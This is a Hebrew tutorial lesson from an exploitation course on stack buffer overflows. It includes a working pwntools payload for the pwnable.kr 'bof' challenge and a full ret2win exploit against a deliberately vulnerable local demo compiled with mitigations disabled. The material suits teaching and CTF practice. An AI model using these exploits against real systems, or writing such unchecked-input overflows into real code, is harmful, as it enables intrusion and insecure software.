בפרקים הקודמים ראינו איך תוכנה נשברת בגלל באגים לוגיים, בלי לגעת בזיכרון בכלל. עכשיו אנחנו נכנסים ללב של הקורס: החולשה שבנתה את כל התחום, גלישת חוצץ על המחסנית. בשיעור הזה נפרק לרסיסים מה בדיוק קורה בזיכרון כשכותבים מעבר לגבול של חוצץ מקומי, איך הבתים הנוספים דורסים קודם את ה-rbp השמור ואחר כך את כתובת החזרה, ולמה דריסה של כתובת החזרה שקולה לשליטה מלאה בזרימת הביצוע של התוכנית. את התיאוריה נמסמר על שני יעדים אמיתיים: האתגר bof מ-pwnable.kr, ודמו מקומי שבו נשתלט על RIP ונקפוץ לפונקציה שאנחנו בוחרים.

מי שעבר את קורס ליבת-המחשב כבר מכיר את כל אבני הבניין: מחסנית, אוגרים, מוסכמת קריאה, ELF ו-GDB. כאן אנחנו לא לומדים אותם מחדש, אלא מלמדים אותם לעבוד בשבילנו.

---

## תזכורת - מבנה של מסגרת מחסנית - stack frame

כשפונקציה נקראת, המעבד והקומפיילר בונים לה מסגרת (frame) על המחסנית. חשוב להפנים שני דברים לפני הכל:

- המחסנית **גדלה כלפי כתובות נמוכות**. כל `push` וכל `call` מקטינים את `rsp`.
- חוצצים (מערכים מקומיים) נכתבים **כלפי כתובות גבוהות**. `buf[0]` נמצא בכתובת נמוכה, `buf[63]` בכתובת גבוהה יותר.

שני הכיוונים ההפוכים האלה הם כל הסיפור. הנתונים שאנחנו שולטים בהם (החוצץ) גדלים בדיוק לכיוון הדברים הרגישים (ה-rbp השמור וכתובת החזרה).

בואו נסתכל על מסגרת טיפוסית של פונקציה עם חוצץ מקומי, במערכת 64 ביט:

```text
כתובות גבוהות
+------------------------------+
| ארגומנטים שעברו על המחסנית   |  (ב-64 ביט הראשונים ב-rdi/rsi/... )
+------------------------------+
| כתובת חזרה - return address  |  <-- [rbp+8]  לכאן ret יקפוץ
+------------------------------+
| rbp שמור - saved rbp         |  <-- [rbp]    ה-rbp של הפונקציה הקוראת
+------------------------------+
| משתנים מקומיים אחרים          |
+------------------------------+
| char buf[64]                 |  <-- [rbp-0x40]  החוצץ, גדל כלפי מעלה
+------------------------------+
כתובות נמוכות (ראש המחסנית, rsp)
```

הפרט הכי חשוב בתמונה: **כתובת החזרה יושבת מעל החוצץ**, בכתובת גבוהה יותר. כשנכתוב לתוך `buf` ונמשיך לכתוב מעבר ל-64 הבתים שלו, נזחל כלפי מעלה ונדרוס קודם את ה-rbp השמור, ואז את כתובת החזרה עצמה.

ב-32 ביט התמונה כמעט זהה, רק שהאוגרים נקראים `ebp`/`esp`, כתובת החזרה ב-`[ebp+4]`, וה-**ארגומנטים לפונקציה מועברים על המחסנית** (מוסכמת cdecl), מעל כתובת החזרה. שימו לב לנקודה הזו, היא בדיוק מה שיאפשר לנו לפתור את bof.

## הגלישה - מה בדיוק נדרס

נסתכל על הקוד הפגיע הקלאסי:

```c
#include <stdio.h>

void vuln() {
    char buf[64];
    gets(buf);   // gets לא בודקת אורך, אף פעם
}

int main() {
    vuln();
    puts("returned safely");
    return 0;
}
```

הפונקציה `gets()` קוראת שורה מהקלט ומעתיקה אותה ל-`buf`, בלי לדעת ובלי לבדוק כמה בתים היא כותבת. אם נזין 64 בתים או פחות, הכל תקין. אבל אם נזין 80 בתים, 16 הבתים העודפים ימשיכו להיכתב מעבר לסוף החוצץ:

```text
לפני הגלישה                          אחרי כתיבת 80 בתים
+---------------------------+        +---------------------------+
| return address            |        | return address  <- נדרס! |
+---------------------------+        +---------------------------+
| saved rbp                 |        | saved rbp       <- נדרס! |
+---------------------------+        +---------------------------+
| buf[63..0]  (64 בתים)     |        | buf[63..0]  = 'A'*64      |
+---------------------------+        +---------------------------+
```

הבתים 65 עד 72 דורסים את ה-rbp השמור, והבתים שאחריהם דורסים את כתובת החזרה. עד עכשיו לא עשינו כלום מיוחד: פשוט שברנו נתונים. הקסם מתחיל ברגע שהפונקציה מסיימת.

## שליטה במצביע ההוראות - RIP

בסוף כל פונקציה יש הוראת `ret`. מה `ret` עושה בפועל? היא שקולה ל:

```asm
pop rip      ; שולפת 8 בתים מראש המחסנית ומכניסה אותם ל-rip
```

כלומר `ret` לוקחת את הערך שיושב בכתובת החזרה, מכניסה אותו למצביע ההוראות `rip`, והמעבד ממשיך לרוץ משם. עכשיו חברו את זה לגלישה: אם הצלחנו לדרוס את כתובת החזרה בערך ש**אנחנו** בחרנו, אז ה-`ret` תקפיץ את הביצוע בדיוק לכתובת שרשמנו. זה מה שקוראים לו שליטה ב-RIP, וזו נקודת המפנה של כל הקורס.

```text
מה שקורה ב-ret אחרי גלישה מוצלחת:

rsp --> +---------------------------+
        | 0x401156  (הכתובת שלנו)   |  ret שולפת את זה
        +---------------------------+
                    |
                    v
              rip = 0x401156   -->  המעבד מריץ מה שיש שם
```

ברגע שיש לנו את היכולת הזו, אנחנו לא סתם מקריסים את התוכנית. אנחנו מחליטים לאן היא רצה. אפשר לקפוץ לפונקציה שכבר קיימת בבינארי, אפשר לקפוץ ל-shellcode שהזרקנו, ואפשר לשרשר גאדג'טים. כל אלה נבנים על אותה יסודה: לדרוס את כתובת החזרה במדויק.

שני דברים צריך כדי לנצל את זה:

1. **את ה-offset המדויק** מתחילת החוצץ ועד כתובת החזרה. בדוגמה למעלה זה 64 (החוצץ) ועוד 8 (ה-rbp השמור), כלומר 72 בתים. בשיעור הבא (2.2) נלמד למצוא את ה-offset אוטומטית עם `cyclic`, בלי לנחש.
2. **כתובת יעד חוקית** לקפוץ אליה. אם נכתוב זבל, נקבל קריסה (SIGSEGV). אם נכתוב כתובת אמיתית, נקבל שליטה.

לפני שנקפוץ לכתובת חזרה, נתחמם על מטרה קלה יותר: לדרוס משתנה מקומי בודד. זה בדיוק האתגר bof.

---

## המקרה הראשון - bof מ-pwnable.kr

האתגר bof הוא ההיכרות הראשונה של כמעט כל pwner עם גלישת חוצץ. הנה קוד המקור שלו (הבינארי הוא 32 ביט):

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);          // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}

int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

בואו נקרא את זה בעיניים של תוקף. `main` קורא ל-`func(0xdeadbeef)`, אז הארגומנט `key` שווה בהתחלה ל-`0xdeadbeef`. הפונקציה `func` בודקת אם `key == 0xcafebabe`, ורק אז מריצה shell. במבט ראשון זה נראה בלתי אפשרי, כי `key` הוזרק כקבוע בקוד. אבל שימו לב איפה `key` יושב בזיכרון.

זו מערכת 32 ביט עם מוסכמת cdecl, ולכן הארגומנט `key` הועבר **על המחסנית**, מעל כתובת החזרה של `func`. והחוצץ `overflowme` יושב בתוך המסגרת של `func`, מתחתיו. כלומר, שוב, החוצץ שאנחנו שולטים בו נמצא מתחת ליעד שאנחנו רוצים לדרוס:

```text
כתובות גבוהות
+------------------------------+
| key = 0xdeadbeef             |  <-- [ebp+8]  היעד שלנו!
+------------------------------+
| כתובת חזרה של func           |  <-- [ebp+4]
+------------------------------+
| ebp שמור                     |  <-- [ebp]
+------------------------------+
| ... ריפוד של הקומפיילר ...    |
+------------------------------+
| char overflowme[32]          |  <-- [ebp-0x2c]  כאן gets כותב
+------------------------------+
כתובות נמוכות
```

הפעם אנחנו לא צריכים לגעת בכתובת החזרה בכלל. אנחנו רק צריכים לכתוב מספיק בתים כדי לזחול מ-`overflowme` עד `key`, ואז לכתוב שם את הערך `0xcafebabe`. ה-`gets` תשמח לכתוב לנו כמה בתים שנרצה.

איך יודעים כמה בתים לרפד? מפרקים את הבינארי. בדיסאסמבלי של `func` רואים שני מספרים מפתח:

```text
lea    eax, [ebp-0x2c]      ; overflowme יושב ב- ebp-0x2c
...
cmp    dword [ebp+0x8], 0xcafebabe   ; key יושב ב- ebp+0x8
```

המרחק מ-`overflowme` (בכתובת `ebp-0x2c`) ועד `key` (בכתובת `ebp+0x8`) הוא `0x2c + 0x8 = 0x34`, כלומר 52 בתים. לכן ה-payload הוא 52 בתים של ריפוד, ואז 4 בתים של `0xcafebabe`:

```python
from pwn import *

payload  = b'A' * 52          # ריפוד עד המשתנה key
payload += p32(0xcafebabe)    # דורסים את key בערך שהבדיקה מצפה לו
```

זהו. ברגע ש-`gets` מסיימת, `func` בודקת את `key`, מוצאת `0xcafebabe`, ומריצה `system("/bin/sh")`. השירות מאזין ב-`nc pwnable.kr 9000`, ואת חיבור ה-remote והפתרון המלא נראה בקובץ הפתרון של השיעור הזה. את השלב של מציאת ה-offset עשינו כאן ידנית מהדיסאסמבלי, ובשיעור 2.2 נעשה אותו אוטומטית.

**הרעיון להפנים:** גלישת חוצץ לא חייבת לדרוס את כתובת החזרה. לפעמים דריסה של משתנה מקומי בודד או של ארגומנט מספיקה כדי לשבור את הלוגיקה של התוכנית. bof הוא המקרה הכי נקי של זה.

## מהמשתנה המקומי לכתובת החזרה - שליטה ב-RIP

עכשיו נעלה מדרגה. במקום לדרוס משתנה, נדרוס את כתובת החזרה ונקפוץ לפונקציה שאנחנו בוחרים. נעבוד על דמו מקומי, ב-64 ביט, שאפשר להדר ולהריץ על מכונת הלימוד:

```c
// demo.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
    puts("[+] you took control!");
    system("/bin/sh");
}

void vuln() {
    char buf[64];
    printf("send: ");
    read(0, buf, 256);        // קורא עד 256 בתים לחוצץ של 64 -> גלישה
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("bye");
    return 0;
}
```

הפונקציה `win()` היא הפרס שלנו: היא פותחת shell, אבל התוכנית אף פעם לא קוראת לה בעצמה. המטרה שלנו היא לגרום ל-`vuln` לחזור אל `win` במקום אל `main`.

נהדר את הדמו עם ההגנות מכובות, כי זה שיעור אנטומיה ולא מירוץ מכשולים. בהמשך הקורס נלמד לעקוף כל אחת מההגנות בנפרד:

```bash
gcc -fno-stack-protector -no-pie -g -o demo demo.c
```

- הדגל `-fno-stack-protector` מכבה את ה-canary, כך שנוכל לדרוס את כתובת החזרה בלי שנתפס.
- הדגל `-no-pie` נועל את הקוד בכתובת קבועה, כך שהכתובת של `win` לא משתנה בין הרצות, גם אם ASLR של המערכת דלוק. ה-NX נשאר דלוק כברירת מחדל, וזה בסדר: אנחנו לא מריצים קוד על המחסנית, רק קופצים לקוד שכבר קיים בבינארי.

תמיד, לפני שכותבים exploit, בודקים אילו הגנות פעילות:

```bash
checksec --file=./demo
```

פלט צפוי:

```text
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE
```

עכשיו שני הנתונים שאנחנו צריכים: ה-offset והיעד.

**היעד** הוא הכתובת של `win`. מכיוון שהבינארי הוא No PIE, היא קבועה. שולפים אותה בקלות:

```bash
objdump -d demo | grep '<win>:'
# 0000000000401156 <win>:
```

או, בתוך pwntools, פשוט `elf.symbols['win']` ולא צריך לזכור מספרים.

**ה-offset** מתחילת `buf` ועד כתובת החזרה. מהדיסאסמבלי של `vuln` נראה שהחוצץ יושב ב-`rbp-0x40`:

```text
lea    rax, [rbp-0x40]      ; buf ב- rbp-0x40
mov    edx, 0x100           ; count = 256
...
call   read
```

מ-`rbp-0x40` ועד ה-rbp השמור (בכתובת `rbp`) יש `0x40 = 64` בתים, ועוד 8 בתים של ה-rbp השמור עצמו, ואז מגיעים לכתובת החזרה. סך הכל 72 בתים ריפוד. **אל תסמכו על החישוב הזה בעיניים סגורות** - הקומפיילר לפעמים מוסיף ריפוד יישור. בשיעור 2.2 נאמת אותו בשנייה עם `cyclic`. כאן אפשר לאמת ידנית ב-GDB: שוברים אחרי ה-`read`, ומודדים את המרחק בין כתובת החוצץ לבין כתובת החזרה ($rbp+8).

עכשיו ה-exploit המלא:

```python
from pwn import *

context.binary = elf = ELF('./demo')

p = process('./demo')

offset  = 72
payload  = b'A' * offset            # ממלא את buf ואת ה-rbp השמור
payload += p64(elf.symbols['win'])  # דורס את כתובת החזרה בכתובת של win

p.sendline(payload)
p.interactive()                     # מקבלים shell
```

הסכימה שנוצרת על המחסנית ברגע שהגלישה מסתיימת:

```text
כתובות גבוהות
+------------------------------+
| p64(&win)  = 0x401156        |  <-- דרסנו את כתובת החזרה. ret יקפוץ לכאן
+------------------------------+
| 'AAAAAAAA'                   |  <-- ה-rbp השמור (נדרס, לא אכפת לנו)
+------------------------------+
| 'AAAA...AAAA'  (64 בתים)     |  <-- buf
+------------------------------+
כתובות נמוכות
```

כש-`vuln` מבצעת `ret`, היא שולפת את `0x401156` לתוך `rip`, והמעבד קופץ ל-`win`. פתחנו shell מקוד שהתוכנית אפילו לא התכוונה להריץ.

### מלכודת יישור המחסנית - stack alignment

יש כאן מוקש אחד שכדאי להכיר כבר עכשיו. במעבדי x86-64, לפני קריאה לפונקציה, ה-ABI דורש שהמחסנית תהיה מיושרת ל-16 בתים. הפונקציה `system` בגרסאות glibc מודרניות מריצה הוראת `movaps` שקורסת (SIGSEGV) אם `rsp` לא מיושר. אחרי שדרסנו את כתובת החזרה וקפצנו ל-`win`, לפעמים היישור יוצא לא נכון וה-shell מת בתוך `system`.

הפתרון הקלאסי: לפני הכתובת של `win`, נשים כתובת של גאדג'ט `ret` בודד. הוא לא עושה כלום מלבד להזיז את `rsp` ב-8 בתים, וזה בדיוק מיישר את המחסנית:

```python
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]      # כתובת של הוראת ret בודדת בבינארי

payload  = b'A' * offset
payload += p64(ret)                    # מיישר את המחסנית ל-16 בתים
payload += p64(elf.symbols['win'])
```

אם ה-shell עובד גם בלי הגאדג'ט, מצוין, אל תוסיפו אותו. אם הוא קורס בתוך `system` על `movaps`, הוספת ה-`ret` תפתור את זה מיד. את הרעיון של קפיצה לפונקציה קיימת (ret2win) נרחיב לעומק בשיעור 2.3.

## מה עם ההגנות - checksec

חשוב להיות ישרים לגבי מתי מה שראינו כאן עובד. בדמו כיבינו את ההגנות בכוונה, אבל בשטח לא תמיד יהיה לכם את המותרות הזאת. הנה איך כל הגנה משפיעה על מה שעשינו:

| הגנה | מצב בדמו | ההשפעה על התקיפה שלנו |
|------|-----------|------------------------|
| קנרי - Stack Canary | כבוי | אילו היה דלוק, דריסה של כתובת החזרה הייתה נתפסת. צריך קודם לדלוף את הקנרי |
| ללא הרצה - NX | דלוק | לא מפריע לנו כאן, כי אנחנו קופצים לקוד קיים ולא מריצים shellcode על המחסנית |
| מיקום אקראי - PIE | כבוי | אילו היה דלוק, כתובת win הייתה משתנה בכל הרצה, והיינו צריכים דליפת כתובת |
| כתובות אקראיות - ASLR | לא רלוונטי לקוד | עם No PIE, הקוד קבוע בזיכרון גם כש-ASLR של המערכת דלוק |

הטבלה הזו היא מפת הדרכים של שאר הפרק ושל הקורס כולו. כל אחד מ-Canary, NX, PIE ו-ASLR מקבל שיעור משלו, ובכל שיעור נלמד את הטריק שמחזיר לנו את השליטה ב-RIP. אבל היסוד תמיד יישאר זהה למה שראינו כאן: למצוא offset, ולדרוס את כתובת החזרה.

## סיכום

- המחסנית גדלה כלפי כתובות נמוכות, אבל חוצצים נכתבים כלפי כתובות גבוהות, ולכן גלישה זוחלת ישר לעבר ה-rbp השמור וכתובת החזרה.
- כתיבה מעבר לגבול של חוצץ מקומי דורסת קודם משתנים מקומיים, אחר כך את ה-rbp השמור, ואז את כתובת החזרה.
- ההוראה `ret` שקולה ל-`pop rip`. דריסה מדויקת של כתובת החזרה נותנת שליטה מלאה במצביע ההוראות, כלומר ב-RIP.
- לא כל גלישה חייבת לגעת בכתובת החזרה. באתגר bof מספיק לדרוס ארגומנט מקומי בערך `0xcafebabe`, במרחק 52 בתים מהחוצץ, כדי לפתוח shell.
- כדי לשלוט ב-RIP צריך שני דברים: את ה-offset המדויק לכתובת החזרה, וכתובת יעד חוקית לקפוץ אליה.
- בדמו מקומי בלי canary ובלי PIE, דרסנו את כתובת החזרה בכתובת של `win` וקיבלנו shell. שימו לב למלכודת יישור המחסנית ולתיקון עם גאדג'ט `ret` בודד.
- תמיד מריצים `checksec` לפני שכותבים exploit. ההגנות שדלוקות קובעות איזו טכניקה תצטרכו.
